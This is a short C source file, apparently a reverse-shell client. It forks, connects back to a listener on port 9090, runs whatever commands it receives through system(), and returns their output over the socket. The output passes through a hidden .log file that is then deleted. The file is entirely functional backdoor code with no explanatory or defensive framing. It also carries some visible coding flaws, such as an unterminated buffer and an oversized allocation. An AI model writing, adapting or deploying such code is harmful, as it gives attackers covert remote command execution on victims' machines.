#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define PORT 9090

int main(int argc, char const *argv[])
{
	int  a = fork();
	if(a == 0)
	{
       	int sock = 0;
       	struct sockaddr_in serv_addr;
       	char *hello = "Hello from client";
       	char buffer[1024] = {0};
       	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
       	{
       	        return -1;
       	}

   	    	serv_addr.sin_family = AF_INET;
       	serv_addr.sin_port = htons(PORT);

       	if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)
       	{
               	return -1;
       	}

   		if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
       	{
               	return -1;
       	}
       	send(sock , hello , strlen(hello) , 0);

		while(1)
		{
		       char com[1024];
                      read(sock , buffer, 1024);
			if(strstr(buffer, "cd"))
			{
				char add[1024];
				sscanf(buffer, "cd %s", add);
				chdir(add);
				continue;
			}
		       if(buffer[0] == '\0') return -1;
                      for(int i = 0; i < strlen(buffer); i++) if(buffer[i] == '\n') buffer[i] = '\0';
		       com[0] = '\0';

                      sprintf(com, "%s > .log", buffer);
                      system(com);

                      FILE* f = fopen(".log", "r");

		       char* out = (char*) malloc (sizeof(char*)*100000000);
                      for(int i = 0; 1; i++)
                      {
                              int tmp = fgetc(f);
                              if(feof(f)) break;

                              out[i] = tmp;
                      }

               	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0 && buffer[0] != ' ')
               	{
                      		send(sock, out, strlen(out), 0);
               	}

                      fclose(f);
                      free(out);
                      buffer[0] = '\0';
                      remove(".log");
               }
	}
       return 0;
}
